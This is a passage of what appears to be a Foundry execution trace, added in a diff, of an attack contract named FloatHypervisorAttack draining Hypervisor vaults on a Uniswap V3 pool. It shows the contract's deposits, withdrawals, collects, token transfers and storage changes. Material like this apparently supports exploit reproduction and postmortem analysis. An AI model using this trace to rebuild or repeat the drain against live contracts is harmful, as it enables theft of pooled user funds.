+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000e971af685497b43d0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [10272] UniV3Pool::collect(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], -86640 [-8.664e4], -80220 [-8.022e4], 16821418945836201021 [1.682e19], 0)
+    │   │   │   │   │   │   │   ├─ [4249] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 16821418945836201021 [1.682e19])
+    │   │   │   │   │   │   │   │   ├─ [3503] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 16821418945836201021 [1.682e19]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 16821418945836201021 [1.682e19])
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0x0000000000000000000000000000000000000000000000d99eaf9a3866b1af81 → 0x0000000000000000000000000000000000000000000000da882149a0bb4963be
+    │   │   │   │   │   │   │   │   │   │   @ 0xb65a6fcba7239a6c772fa71308ae3f27965827fb0aa7332845b0a66e1591e5d0: 0x000000000000000000000000000000000000000000004de4be683d5b2174bf1e → 0x000000000000000000000000000000000000000000004de3d4f68df2ccdd0ae1
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit Collect(owner: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], recipient: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], tickLower: -86640 [-8.664e4], tickUpper: -80220 [-8.022e4], amount0: 16821418945836201021 [1.682e19], amount1: 0)
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x545949ce2dcc29d7f8c784f31fc312196fc8d500689835f9e3b7bb9091f3591a: 0x0000000000000000000019090cada3e80000000000000000eb8308a00051f5c1 → 0x0000000000000000000019090cada3e8000000000000000002115937abba4184
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000e971af685497b43d0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [1207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 7180051764715447987753 [7.18e21]
+    │   │   │   │   │   │   │   └─ ← [Return] 7180051764715447987753 [7.18e21]
+    │   │   │   │   │   │   ├─ [534] WETH9::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 201634862578394866656 [2.016e20]
+    │   │   │   │   │   │   ├─ [4249] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 7114080750335035781808 [7.114e21])
+    │   │   │   │   │   │   │   ├─ [3503] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 7114080750335035781808 [7.114e21]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 7114080750335035781808 [7.114e21])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0x0000000000000000000000000000000000000000000000da882149a0bb4963be → 0x00000000000000000000000000000000000000000000025c2fd5480ad77e966e
+    │   │   │   │   │   │   │   │   │   @ 0xc4acc6036fca33b1d1cf4b03d2bfb475e13c8be5a95109648009df80c5e50873: 0x0000000000000000000000000000000000000000000001853b3c1e76ccdd2e29 → 0x0000000000000000000000000000000000000000000000039388200cb0a7fb79
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [3262] WETH9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 199782221837819523552 [1.997e20])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 199782221837819523552 [1.997e20])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xbe2418a4c7634bc49aeab062e4fa8b7c6e86d01842dd0838fbedcb63e02edc4f: 0x00000000000000000000000000000000000000000000000aee3eef352fee23e0 → 0x00000000000000000000000000000000000000000000000019b5e6f01668f200
+    │   │   │   │   │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x00000000000000000000000000000000000000000000002c057059f8d71a7f2e → 0x000000000000000000000000000000000000000000000036d9f9623df09fb10e
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: 0x0000000000000000000000000000000000000000, amount: 222628862475761717806 [2.226e20])
+    │   │   │   │   │   │   ├─ emit Withdraw(param0: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], param1: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], param2: 222628862475761717806 [2.226e20], param3: 7145280160821793429102 [7.145e21], param4: 199782221837819523552 [1.997e20])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000000000c2e3f32cf22ff8506 → 0x0000000000000000000000000000000000000000000000001ca697ecf9edf2d8
+    │   │   │   │   │   │   │   @ 0xf681125939867b53b18ed9e847456377cee007cff53bf8cca400f655f93a8ef1: 0x00000000000000000000000000000000000000000000000c11989ae22911922e → 0
+    │   │   │   │   │   │   └─ ← [Return] 7145280160821793429102 [7.145e21], 199782221837819523552 [1.997e20]
+    │   │   │   │   │   ├─ [273447] 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f::deposit(4000000000000000000000 [4e21], 400000000000000000000 [4e20], FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab])
+    │   │   │   │   │   │   ├─ [45425] HypervisorB::getTotalAmounts() [staticcall]
+    │   │   │   │   │   │   │   ├─ [9013] UniV3Pool::positions(0xeff0db1974f385f4c8ecaa9e59b9a8dc43ca19dc5a9de969438ae736a8326c49) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000004eabb40d838c0e76d00000000000000000000000000000001435ad503dea2b8d1ff0b6e4c3a4ffc7b00000000000000000000000000000000002e47bf5a28305da853b42673400563000000000000000000000000000000000000000000000014e5884385970a5503000000000000000000000000000000000000000000000000025bc7911c745b08
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000001aa21dbcd4db719b52ed5fdfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe7692000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [9013] UniV3Pool::positions(0xed2333d38121452740eb1ba5b5fdfa061273e293036ec233e5071f8714bb64c9) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000047a0d234f098751c00000000000000000000000000000000d1b2f32c27db0cae2ff8df75d165f45200000000000000000000000000000000001e945acc5aa51be7fda2946574a50e0000000000000000000000000000000000000000000000006b5a93d3d890047c000000000000000000000000000000000000000000000000000722aeb7f702de
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000001aa21dbcd4db719b52ed5fdfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe7692000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [3207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 32279037816225215491878 [3.227e22]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 32279037816225215491878 [3.227e22]
+    │   │   │   │   │   │   │   ├─ [2534] WETH9::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   └─ ← [Return] 47170012870207958865657 [4.717e22], 795280521259303843 [7.952e17]
+    │   │   │   │   │   │   ├─ [2389] HypervisorB::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 25822437733451680325 [2.582e19]
+    │   │   │   │   │   │   ├─ [428] HypervisorB::token0() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9
+    │   │   │   │   │   │   ├─ [28762] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transferFrom(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, 4000000000000000000000 [4e21])
+    │   │   │   │   │   │   │   ├─ [28010] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transferFrom(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, 4000000000000000000000 [4e21]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, amount: 4000000000000000000000 [4e21])
+    │   │   │   │   │   │   │   │   ├─ emit Approval(owner: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], spender: 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, amount: 115792089237316195423570985008687907853269984665640564035457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xf77bed83fe805e48a8bd8787e0875874b8398ae52a279ed93296a06ecdb040a8: 0 → 0x0000000000000000000000000000000000000000000000d8d726b7177a800000
+    │   │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0x00000000000000000000000000000000000000000000025c2fd5480ad77e966e → 0x00000000000000000000000000000000000000000000018358ae90f35cfe966e
+    │   │   │   │   │   │   │   │   │   @ 0x7493fa38636fdf53bc6a25e0ed6dd59a309439f6929b684d878489663566a1f9: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffff2728d948e8857fffff
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [426] HypervisorB::token1() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   │   │   │   │   ├─ [25325] WETH9::transferFrom(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, 400000000000000000000 [4e20])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, amount: 400000000000000000000 [4e20])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x5fb91ab42e510d77619974e93a20ebb0ddff4e0f3902f7d11ac2d50d522849fa: 0 → 0x000000000000000000000000000000000000000000000015af1d78b58c400000
+    │   │   │   │   │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x000000000000000000000000000000000000000000000036d9f9623df09fb10e → 0x0000000000000000000000000000000000000000000000212adbe988645fb10e
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [156699] HypervisorB::deposit(4000000000000000000000 [4e21], 400000000000000000000 [4e20], FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab])
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0xeff0db1974f385f4c8ecaa9e59b9a8dc43ca19dc5a9de969438ae736a8326c49) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000004eabb40d838c0e76d00000000000000000000000000000001435ad503dea2b8d1ff0b6e4c3a4ffc7b00000000000000000000000000000000002e47bf5a28305da853b42673400563000000000000000000000000000000000000000000000014e5884385970a5503000000000000000000000000000000000000000000000000025bc7911c745b08
+    │   │   │   │   │   │   │   ├─ [24864] UniV3Pool::burn(-887220 [-8.872e5], 887220 [8.872e5], 0)
+    │   │   │   │   │   │   │   │   ├─ emit Burn(owner: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], tickLower: -887220 [-8.872e5], tickUpper: 887220 [8.872e5], amount: 0, amount0: 0, amount1: 0)
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x5935eda6ed16c68661381eaa7c225e7488300f2a8a3e7a867ca0642d36d24817: 0x00000000000000000000000000000000002e47bf5a28305da853b42673400563 → 0x00000000000000000000000000000000002e48a2e576c4a19ebf8686c295de54
+    │   │   │   │   │   │   │   │   │   @ 0x5935eda6ed16c68661381eaa7c225e7488300f2a8a3e7a867ca0642d36d24816: 0x00000000000000000000000000000001435ad503dea2b8d1ff0b6e4c3a4ffc7b → 0x000000000000000000000000000000017ebc0af50f057d2c116191836b92c717
+    │   │   │   │   │   │   │   │   │   @ 0x5935eda6ed16c68661381eaa7c225e7488300f2a8a3e7a867ca0642d36d24818: 0x0000000000000000025bc7911c745b080000000000000014e5884385970a5503 → 0x0000000000000000025bcbefed74e5070000000000000016097f65a5aaa9d807
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0xed2333d38121452740eb1ba5b5fdfa061273e293036ec233e5071f8714bb64c9) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000047a0d234f098751c00000000000000000000000000000000d1b2f32c27db0cae2ff8df75d165f45200000000000000000000000000000000001e945acc5aa51be7fda2946574a50e0000000000000000000000000000000000000000000000006b5a93d3d890047c000000000000000000000000000000000000000000000000000722aeb7f702de
+    │   │   │   │   │   │   │   ├─ [20864] UniV3Pool::burn(-887220 [-8.872e5], -77220 [-7.722e4], 0)
+    │   │   │   │   │   │   │   │   ├─ emit Burn(owner: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], tickLower: -887220 [-8.872e5], tickUpper: -77220 [-7.722e4], amount: 0, amount0: 0, amount1: 0)
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x76a039fd0b70a7736511e79e69ab7b0edae1ec29ea9bc08c9d2778da09a5cc09: 0x0000000000000000000722aeb7f702de00000000000000006b5a93d3d890047c → 0x0000000000000000000722ee628bb66e00000000000000007bf7d74d7986f4ce
+    │   │   │   │   │   │   │   │   │   @ 0x76a039fd0b70a7736511e79e69ab7b0edae1ec29ea9bc08c9d2778da09a5cc07: 0x00000000000000000000000000000000d1b2f32c27db0cae2ff8df75d165f452 → 0x000000000000000000000000000000010d14291d583dd108424f02ad02a8beee
+    │   │   │   │   │   │   │   │   │   @ 0x76a039fd0b70a7736511e79e69ab7b0edae1ec29ea9bc08c9d2778da09a5cc08: 0x00000000000000000000000000000000001e945acc5aa51be7fda2946574a50e → 0x00000000000000000000000000000000001e953e57a9395fde6974f4b4ca7dff
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000001aa21dbcd4db719b52ed5fdfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe7692000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0xeff0db1974f385f4c8ecaa9e59b9a8dc43ca19dc5a9de969438ae736a8326c49) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000004eabb40d838c0e76d000000000000000000000000000000017ebc0af50f057d2c116191836b92c71700000000000000000000000000000000002e48a2e576c4a19ebf8686c295de54000000000000000000000000000000000000000000000016097f65a5aaa9d807000000000000000000000000000000000000000000000000025bcbefed74e507
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000001aa21dbcd4db719b52ed5fdfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe7692000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0xed2333d38121452740eb1ba5b5fdfa061273e293036ec233e5071f8714bb64c9) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000047a0d234f098751c000000000000000000000000000000010d14291d583dd108424f02ad02a8beee00000000000000000000000000000000001e953e57a9395fde6974f4b4ca7dff0000000000000000000000000000000000000000000000007bf7d74d7986f4ce000000000000000000000000000000000000000000000000000722ee628bb66e
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000001aa21dbcd4db719b52ed5fdfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe7692000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [1207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 32279037816225215491878 [3.227e22]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 32279037816225215491878 [3.227e22]
+    │   │   │   │   │   │   │   ├─ [534] WETH9::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   ├─ [14462] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transferFrom(0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], 4000000000000000000000 [4e21])
+    │   │   │   │   │   │   │   │   ├─ [13710] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transferFrom(0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], 4000000000000000000000 [4e21]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, to: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], amount: 4000000000000000000000 [4e21])
+    │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, spender: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], amount: 115792089237316195423570985008687907853269984665640563819327100136945387789935 [1.157e77])
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0xf77bed83fe805e48a8bd8787e0875874b8398ae52a279ed93296a06ecdb040a8: 0x0000000000000000000000000000000000000000000000d8d726b7177a800000 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x9617c035d2c1fd8a16f6c18f78c25f392a246ef1713d0b0f48b7e431245e8b3d: 0x0000000000000000000000000000000000000000000006d5d9a3302f50b32f26 → 0x0000000000000000000000000000000000000000000007aeb0c9e746cb332f26
+    │   │   │   │   │   │   │   │   │   │   @ 0x8d9869854d4c63a8a8e118cf209b2e7be87d7bc818e1d2205783f4ea778e4e8d: 0xffffffffffffffffffffffffffffffffffffffffffffd23b8b018bbc4ad75e6f → 0xffffffffffffffffffffffffffffffffffffffffffffd162b3dad4a4d0575e6f
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [25325] WETH9::transferFrom(0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], 400000000000000000000 [4e20])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, to: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], amount: 400000000000000000000 [4e20])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x2b8a864f9f2112a9074fd12f453b8d016c0fcff25857ae548779e19ac6df1bd1: 0 → 0x000000000000000000000000000000000000000000000015af1d78b58c400000
+    │   │   │   │   │   │   │   │   │   @ 0x5fb91ab42e510d77619974e93a20ebb0ddff4e0f3902f7d11ac2d50d522849fa: 0x000000000000000000000000000000000000000000000015af1d78b58c400000 → 0
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 3703209972128726462535 [3.703e21])
+    │   │   │   │   │   │   │   ├─ emit Deposit(param0: 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, param1: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], param2: 3703209972128726462535 [3.703e21], param3: 4000000000000000000000 [4e21], param4: 400000000000000000000 [4e20])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xf681125939867b53b18ed9e847456377cee007cff53bf8cca400f655f93a8ef1: 0 → 0x0000000000000000000000000000000000000000000000c8c05cb93428f53047
+    │   │   │   │   │   │   │   │   @ 2: 0x000000000000000000000000000000000000000000000001665bba4e3107ca45 → 0x0000000000000000000000000000000000000000000000ca26b8738259fcfa8c
+    │   │   │   │   │   │   │   └─ ← [Return] 3703209972128726462535 [3.703e21]
+    │   │   │   │   │   │   └─ ← [Return] 3703209972128726462535 [3.703e21]
+    │   │   │   │   │   ├─ [113688] HypervisorB::withdraw(3703209972128726462535 [3.703e21], FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab])
+    │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0xeff0db1974f385f4c8ecaa9e59b9a8dc43ca19dc5a9de969438ae736a8326c49) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000004eabb40d838c0e76d000000000000000000000000000000017ebc0af50f057d2c116191836b92c71700000000000000000000000000000000002e48a2e576c4a19ebf8686c295de54000000000000000000000000000000000000000000000016097f65a5aaa9d807000000000000000000000000000000000000000000000000025bcbefed74e507
+    │   │   │   │   │   │   ├─ [30203] UniV3Pool::burn(-887220 [-8.872e5], 887220 [8.872e5], 90073081921843106274 [9.007e19])
+    │   │   │   │   │   │   │   ├─ emit Burn(owner: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], tickLower: -887220 [-8.872e5], tickUpper: 887220 [8.872e5], amount: 90073081921843106274 [9.007e19], amount0: 13852575945758839350449 [1.385e22], amount1: 585678802171304264 [5.856e17])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 4: 0x000000000000000000000000000000000000000000000042a388e80f20c611db → 0x00000000000000000000000000000000000000000000003dc185094760a7fff9
+    │   │   │   │   │   │   │   │   @ 0x5935eda6ed16c68661381eaa7c225e7488300f2a8a3e7a867ca0642d36d24818: 0x0000000000000000025bcbefed74e5070000000000000016097f65a5aaa9d807 → 0x00000000000000000a7c8bb4695a7e4f0000000000000304fc9b7238cf1cfcb8
+    │   │   │   │   │   │   │   │   @ 0xdc3f4388499eef42a791da8d78f6e4b5cc6376b0349c5622dcbfad8d3aa7f5bd: 0xffffffffffffffbda417ea25cfd2634100000000000000425be815da302d9cbf → 0xffffffffffffffc2861bc8ed8ff07523000000000000003d79e43712700f8add
+    │   │   │   │   │   │   │   │   @ 0x7f16e4ac80e3195175c78aa64fe305d939ea0f7e52dc9181b922712fa7117c19: 0x0000000000000042a388e80f20c611db0000000000000042a388e80f20c611db → 0x000000000000003dc185094760a7fff9000000000000003dc185094760a7fff9
+    │   │   │   │   │   │   │   │   @ 0x5935eda6ed16c68661381eaa7c225e7488300f2a8a3e7a867ca0642d36d24815: 0x000000000000000000000000000000000000000000000004eabb40d838c0e76d → 0x00000000000000000000000000000000000000000000000008b7621078a2d58b
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000002eef31c0c93247324b10000000000000000000000000000000000000000000000000820bfc47be59948
+    │   │   │   │   │   │   ├─ [14836] UniV3Pool::collect(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], -887220 [-8.872e5], 887220 [8.872e5], 13852575945758839350449 [1.385e22], 585678802171304264 [5.856e17])
+    │   │   │   │   │   │   │   ├─ [4249] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 13852575945758839350449 [1.385e22])
+    │   │   │   │   │   │   │   │   ├─ [3503] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 13852575945758839350449 [1.385e22]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 13852575945758839350449 [1.385e22])
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
